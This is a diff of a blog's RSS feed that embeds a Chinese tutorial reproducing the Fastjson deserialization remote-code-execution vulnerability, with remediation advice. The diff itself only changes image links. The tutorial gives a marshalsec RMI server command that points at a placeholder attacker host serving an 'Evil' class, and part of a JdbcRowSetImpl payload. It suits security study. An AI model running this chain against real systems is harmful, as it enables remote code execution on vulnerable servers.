@@ -9,9 +9,9 @@
         <lastBuildDate>Mon, 30 Mar 2026 20:35:03 +0800</lastBuildDate>
         <category>Java代码审计</category>
         <category>Java安全</category>
+        <category>环境问题</category>
         <category>Hexo</category>
         <category>ShokaX</category>
-        <category>环境问题</category>
         <item>
             <guid isPermalink="true">https://lib0gus.github.io/2026/03/30/Java%E5%AE%89%E5%85%A8%E4%B9%8BShiro/</guid>
             <title>Java安全之Shiro</title>
@@ -223,7 +223,7 @@
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;也就是说高版本 JDK 直接阻断了通过 RMI 加载远程恶意类这条路。&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;所以要复现这个漏洞，必须用 8u191 以下的版本。&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;②搭建Maven项目&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2026/png/39222866/1774689877369-d5ae36ee-01fa-49cc-9768-7f399d5d0c53.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775045888982.png&#34; alt=&#34;1775045888982&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;③添加Fastjson依赖&lt;/p&gt;
 &lt;p&gt;在pom.xml中添加依赖&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&#34;color:#1E754F;--shiki-dark:#4D9375&#34;&gt;dependencies&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
@@ -261,7 +261,7 @@
 &lt;span class=&#34;line&#34;&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#1E754F;--shiki-dark:#4D9375&#34;&gt;project&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;添加后点击右上角下载依赖或直接使用本地仓库&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2026/png/39222866/1774690055705-06792290-b886-45b6-9de7-90238b19bf29.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775045908005.png&#34; alt=&#34;1775045908005&#34; /&gt;&lt;/p&gt;
 &lt;h3 id=&#34;12-创建项目&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12-创建项目&#34;&gt;#&lt;/a&gt; 1.2 创建项目&lt;/h3&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#1E754F;--shiki-dark:#4D9375&#34;&gt;package&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt; com&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;example&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;/span&gt;
@@ -326,7 +326,7 @@
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;}&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;运行结果如下：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2026/png/39222866/1774691509826-70db82f1-eabf-42ec-ba7f-5ce072376e8d.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775045917858.png&#34; alt=&#34;1775045917858&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;我们可以看到&lt;/p&gt;
 &lt;p&gt;@type 指向了我们自己创建的类文件&lt;/p&gt;
 &lt;p&gt;JSON 数据中包含了name和age两个参数&lt;/p&gt;
@@ -352,7 +352,7 @@
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#B07D48;--shiki-dark:#BD976A&#34;&gt;        System&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#B07D48;--shiki-dark:#BD976A&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;user&lt;/span&gt;&lt;span style=&#34;color:#a65e2b;--shiki-dark:#d4976c&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#1e754f;--shiki-dark:#4d9375&#34;&gt;}&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2026/png/39222866/1774691873438-01ee36d1-cd98-4f86-a6ae-18f7bb66c2ba.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775045927433.png&#34; alt=&#34;1775045927433&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;此时我们可以看到，该方式没有触发任何的getter方法，只触发了setter方法&lt;/p&gt;
 &lt;table&gt;
 &lt;thead&gt;
@@ -398,7 +398,7 @@
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#59873A;--shiki-dark:#80A665&#34;&gt;java&lt;/span&gt;&lt;span style=&#34;color:#A65E2B;--shiki-dark:#C99076&#34;&gt; -cp&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; marshalsec-0.0.3-SNAPSHOT-all.jar&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt; marshalsec.jndi.RMIRefServer&lt;/span&gt;&lt;span style=&#34;color:#B5695977;--shiki-dark:#C98A7D77&#34;&gt; &#34;&lt;/span&gt;&lt;span style=&#34;color:#B56959;--shiki-dark:#C98A7D&#34;&gt;http://攻击机IP:端口/#Evil&lt;/span&gt;&lt;span style=&#34;color:#B5695977;--shiki-dark:#C98A7D77&#34;&gt;&#34;&lt;/span&gt;&lt;span style=&#34;color:#2F798A;--shiki-dark:#4C9A91&#34;&gt; 9999&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;出现* Opening JRMP listener on 9999即说明成功开启(注意:如果上传至云服务器时，记得开启端口;若在本地可以使用python简单搭建一个服务用来下载)&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2026/png/39222866/1774692662801-b5952536-21cc-49df-9585-89a9307e7d6f.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775045940496.png&#34; alt=&#34;1775045940496&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;此时我们修改测试类的payload，来实现RCE&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;{&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;    &#34;@type&#34; : &#34;com.sun.rowset.JdbcRowSetImpl&#34;,&lt;/span&gt;&lt;/span&gt;
@@ -407,7 +407,7 @@
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;成功实现弹窗&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2026/png/39222866/1774692957916-52cfd1ea-8b9d-4338-a17b-53daf149e646.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775045958900.png&#34; alt=&#34;1775045958900&#34; /&gt;&lt;/p&gt;
 &lt;h1 id=&#34;官方前期维护方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#官方前期维护方法&#34;&gt;#&lt;/a&gt; 官方前期维护方法&lt;/h1&gt;
 &lt;p&gt;而官方对于该漏洞的更新一开始则是使用黑名单来对抗，但众所周知，黑名单是容易被绕过的。&lt;/p&gt;
 &lt;p&gt;所以在1.2.47以前，攻击者与官方维护一直处于一个添加黑名单-&amp;gt;被绕过-&amp;gt;再完善黑名单-&amp;gt;再次绕过的一个循环里。Fastjson维护了一个“危险类列表”（如com.sun.rowset.JdbcRowSetImpl）,如果json中的@type指定了这些类，则会直接抛出异常&lt;/p&gt;
@@ -452,7 +452,7 @@
 &lt;p&gt;3、必须能够接收val参数&lt;/p&gt;
 &lt;p&gt;所以，理论上来说不是黑名单里的类都可以，但实际上需要满足的条件不止于此。综上所述，能够实现的类少之又少，java.lang.Class天然满足上述条件。&lt;/p&gt;
 &lt;p&gt;此时我们再次发送数据包，成功实现RCE&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2026/png/39222866/1774766830441-537ce4c3-c9f0-49cd-bba0-26390dc0f676.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;1775045969873.png&#34; alt=&#34;1775045969873&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;修复方案：&lt;/p&gt;
 &lt;p&gt;1、提升JDK版本&lt;/p&gt;
 &lt;p&gt;JDK 官方在底层代码中“堵死”了攻击者利用 JNDI 远程加载代码的路径。&lt;/p&gt;
